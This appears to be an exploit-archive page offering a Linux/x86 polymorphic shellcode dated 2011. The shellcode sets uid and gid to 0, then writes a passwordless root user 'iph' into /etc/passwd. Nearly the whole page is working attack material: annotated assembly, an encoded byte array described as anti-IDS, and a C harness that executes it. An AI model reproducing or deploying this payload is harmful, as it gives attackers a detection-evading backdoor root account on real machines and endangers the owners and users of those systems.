<html><head><title>Linux/x86 - setuid(0)+setgid(0)+add user iph without password to /etc/passwd - 124 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
# Exploit Title: Linux/x86 Polymorphic ShellCode - setuid(0)+setgid(0)+add user 'iph' without password to /etc/passwd
# setuid() - setgid() - open() - write() - close() - exit()
# Date: 30/12/2011
# Author: pentesters.ir
# Tested on: Linux x86 - CentOS 6.0 - 2.6.32-71
# Website: http://pentesters.ir/
# Contact: Cru3l.b0y@gmail.com
# By: Cru3l.b0y
# iph::0:0:IPH:/root:/bin/bash
# This ShellCode is Anti-IDS
# Encode: ADD 10

&quot;\xb0\x17&quot;                  	// mov    $0x17,%al
&quot;\x31\xdb&quot;                  	// xor    %ebx,%ebx
&quot;\xcd\x80&quot;                  	// int    $0x80
&quot;\xb0\x2e&quot;                  	// mov    $0x2e,%al
&quot;\x53&quot;                      	// push   %ebx
&quot;\xcd\x80&quot;                  	// int    $0x80
&quot;\x6a\x05&quot;                   	// push   $0x5
&quot;\x58&quot;                   	// pop    %eax
&quot;\x31\xc9&quot;                	// xor    %ecx,%ecx
&quot;\x51&quot;                   	// push   %ecx
&quot;\x68\x73\x73\x77\x64&quot;       	// push   $0x64777373
&quot;\x68\x2f\x2f\x70\x61&quot;       	// push   $0x61702f2f
&quot;\x68\x2f\x65\x74\x63&quot;       	// push   $0x6374652f
&quot;\x89\xe3&quot;                	// mov    %esp,%ebx
&quot;\x66\xb9\x01\x04&quot;          	// mov    $0x401,%cx
&quot;\xcd\x80&quot;                  	// int    $0x80
&quot;\x89\xc3&quot;                  	// mov    %eax,%ebx
&quot;\x6a\x04&quot;                  	// push   $0x4
&quot;\x58&quot;                      	// pop    %eax
&quot;\x31\xd2&quot;                  	// xor    %edx,%edx
&quot;\x52&quot;                      	// push   %edx
&quot;\x68\x62\x61\x73\x68&quot;       	// push   $0x68736162
&quot;\x68\x62\x69\x6e\x2f&quot;       	// push   $0x2f6e6962
&quot;\x68\x6f\x74\x3a\x2f&quot;       	// push   $0x2f3a746f
&quot;\x68\x3a\x2f\x72\x6f&quot;       	// push   $0x6f722f3a
&quot;\x68\x3a\x49\x50\x48&quot;       	// push   $0x4850493a
&quot;\x68\x3a\x30\x3a\x30&quot;       	// push   $0x303a303a
&quot;\x68\x69\x70\x68\x3a&quot;       	// push   $0x3a687069
&quot;\x89\xe1&quot;               	// mov    %esp,%ecx
&quot;\x6a\x1c&quot;                  	// push   $0x1c
&quot;\x5a&quot;                      	// pop    %edx
&quot;\xcd\x80&quot;                  	// int    $0x80
&quot;\x6a\x06&quot;                   	// push   $0x6
&quot;\x58&quot;                      	// pop    %eax
&quot;\xcd\x80&quot;                   	// int    $0x80
&quot;\x6a\x01&quot;                  	// push   $0x1
&quot;\x58&quot;                      	// pop    %eax
&quot;\xcd\x80&quot;                	// int    $0x80
*/

// ##### ANTI IDS SHELLCODE #####

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

char sc[] =
&quot;\xeb\x11\x5e\x31\xc9\xb1\x64\x80\x6c\x0e\xff\x0a\x80\xe9&quot;
&quot;\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\xba\x21\x3b\xe5&quot;
&quot;\xd7\x8a\xba\x38\x5d\xd7\x8a\x74\x0f\x62\x3b\xd3\x5b\x72&quot;
&quot;\x7d\x7d\x81\x6e\x72\x39\x39\x7a\x6b\x72\x39\x6f\x7e\x6d&quot;
&quot;\x93\xed\x70\xc3\x0b\x0e\xd7\x8a\x93\xcd\x74\x0e\x62\x3b&quot;
&quot;\xdc\x5c\x72\x6c\x6b\x7d\x72\x72\x6c\x73\x78\x39\x72\x79&quot;
&quot;\x7e\x44\x39\x72\x44\x39\x7c\x79\x72\x44\x53\x5a\x52\x72&quot;
&quot;\x44\x3a\x44\x3a\x72\x73\x7a\x72\x44\x93\xeb\x74\x26\x64&quot;
&quot;\xd7\x8a\x74\x10\x62\xd7\x8a\x74\x0b\x62\xd7\x8a&quot;;

int main()
{
	int (*fp)() = (int(*)())sc;
    	printf(&quot;bytes: %u\n&quot;, strlen(sc));
    	fp();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
